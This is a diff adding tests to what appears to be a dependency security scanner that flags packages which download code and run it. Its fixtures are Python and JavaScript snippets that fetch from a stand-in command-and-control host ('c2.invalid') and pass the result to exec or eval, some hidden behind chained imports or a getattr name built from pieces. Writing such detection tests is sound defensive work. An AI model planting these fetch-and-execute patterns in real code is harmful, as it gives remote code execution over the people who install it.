@@ -14,6 +14,7 @@ import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
 import { crossFileIssues } from "../src/lib/native.js";
+import { siteGroups } from "../src/deps.js";
 
 const U = "'https://c2.invalid/p'";
 const PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n";
@@ -108,6 +109,56 @@ test("--deps runs the follower; a file already flagged CRITICAL is left alone", 
       ["node_modules/pkg/run.js", "CRITICAL", RECEIVED + " (./net)."],
       ["node_modules/solo/run.js", "CRITICAL", "Dependency code runs code it receives over the network."],
     ]);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+    rmSync(out, { recursive: true, force: true });
+  }
+});
+
+test("a runner behind another function, more hops, a getattr name the file builds (the detection round)", () => {
+  assert.deepEqual(found(py({ "pkg/util.py": "def run(code):\n    exec(code)\n",
+    "pkg/mid.py": "from .util import run\n\ndef go(c):\n    run(c)\n",
+    "pkg/__init__.py": "import requests\nfrom .mid import go\ngo(requests.get(" + U + ").text)\n" })),
+  [["site-packages/pkg/__init__.py", "CRITICAL", RUN_THERE]]);
+  assert.deepEqual(found(js({ "util.js": "exports.execute = (code) => eval(code);\n",
+    "mid.js": "const { execute } = require('./util');\nfunction go(c) {\n  return execute(c);\n}\nmodule.exports = { go };\n",
+    "index.js": "const { go } = require('./mid');\nfetch(" + U + ").then((r) => r.text()).then((c) => go(c));\n" })),
+  [["node_modules/pkg/index.js", "CRITICAL", RUN_THERE]]);
+  const hops = { "pkg/_net.py": PY_NET };
+  let prev = ["._net", "pull"];
+  for (let i = 0; i < 6; i++) {
+    hops[`pkg/h${i}.py`] = `from ${prev[0]} import ${prev[1]}\n\ndef f${i}():\n    return ${prev[1]}()\n`;
+    prev = [`.h${i}`, `f${i}`];
+  }
+  hops["pkg/run.py"] = `from ${prev[0]} import ${prev[1]}\nexec(${prev[1]}())\n`;
+  assert.deepEqual(found(py(hops)), [["site-packages/pkg/run.py", "CRITICAL", RECEIVED]]);
+  assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pu' + 'll'\nexec(getattr(_net, NAME)())\n" })),
+    [["site-packages/pkg/run.py", "CRITICAL", RECEIVED]]);
+  assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pull'\nNAME = input()\nexec(getattr(_net, NAME)())\n" })), []);
+});
+
+test("a distribution's top-level modules are one package: its RECORD lists them (the detection round)", () => {
+  const site = "venv/lib/python3.12/site-packages";
+  const files = {
+    [`${site}/a.py`]: PY_NET,
+    [`${site}/b.py`]: "from a import pull\nexec(pull())\n",
+    [`${site}/c.py`]: "from a import pull\neval(pull())\n",
+    [`${site}/x-1.0.dist-info/RECORD`]: "a.py,sha256=1,2\nb.py,,\nx-1.0.dist-info/RECORD,,\n../../../bin/x,,\n",
+    [`${site}/ns1-1.dist-info/RECORD`]: "ns/one/__init__.py,,\n",
+  };
+  const root = mkdtempSync(join(tmpdir(), "lz-xf-site-"));
+  const out = mkdtempSync(join(tmpdir(), "lz-xf-site-out-"));
+  try {
+    for (const [rel, data] of Object.entries(files)) {
+      mkdirSync(dirname(join(root, rel)), { recursive: true });
+      writeFileSync(join(root, rel), data);
+    }
+    const deps = ["a.py", "b.py", "c.py"].map((n) => ({ path: join(site, n), lang: "py", dep: true, content: files[`${site}/${n}`] }));
+    assert.deepEqual(siteGroups(root, deps), { [`${site}/a.py`]: `${site}/x-1.0.dist-info`, [`${site}/b.py`]: `${site}/x-1.0.dist-info` });
+    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
+    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
+    const got = rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => [i.file.replaceAll("\\", "/"), i.sev]);
+    assert.deepEqual(got, [[`${site}/b.py`, "CRITICAL"]]);
   } finally {
     rmSync(root, { recursive: true, force: true });
     rmSync(out, { recursive: true, force: true });
